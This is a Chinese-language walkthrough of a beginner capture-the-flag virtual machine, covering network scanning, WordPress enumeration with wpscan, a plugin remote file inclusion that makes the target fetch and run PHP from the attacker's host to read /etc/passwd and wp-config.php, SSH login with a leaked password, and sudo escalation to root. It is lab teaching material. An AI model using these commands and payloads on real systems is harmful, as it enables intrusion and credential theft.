目标：2个flag

级别：初级

1、主机探测

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.169

查看开放22、80端口

3、WEB渗透测试

3.1 使用dirb进行探测扫描，发现有一个WordPress站点

3.2 首页和robots.txt没有有用信息，使用wpscan进行扫描

扫描漏洞插件

wpscan --url http://192.168.207.169/wordpress/ -e ap

扫描网站用户

wpscan --url http://192.168.207.169/wordpress/ -e u


3.3 漏洞插件利用方式

3.4 根据payload利用方式，创建文件查看/etc/passwd

在kali上配置payload，并开启http服务

echo "<pre>system('cat /etc/passwd')</pre>" > pass.txtpython  -m SimpleHTTPServer 80

使用如下链接访问，并修改远端地址为kali的IP地址


http://192.168.207.169/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.207.129/pass.txt
查看有登录权限的账号是root和takis

3.5 在kali上配置查看wordpress配置文件

echo "<pre>system('cat /var/www/html/wordpress/wp-config.php')</pre>" > pass.txt

重新访问页面，显示乱码信息

http://192.168.207.169/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.207.129/pass.txt

查看网页源代码，获取到数据库的用户名为wp_user，密码为：R3&]vzhHmMn9,:-5

3.6 使用takis和密码R3&]vzhHmMn9,:-5进行登录成功

ssh takis@192.168.207.169

4、系统提权

4.1 查看sudo权限

sudo -l

4.2 切换root账号

sudo su

4.3 查看root目录文件显示查找USB,获取flag

cat /root/root.txtfind / type -d -name "USB" 2>/dev/nullcd /usr/games/USBls -lahcat root
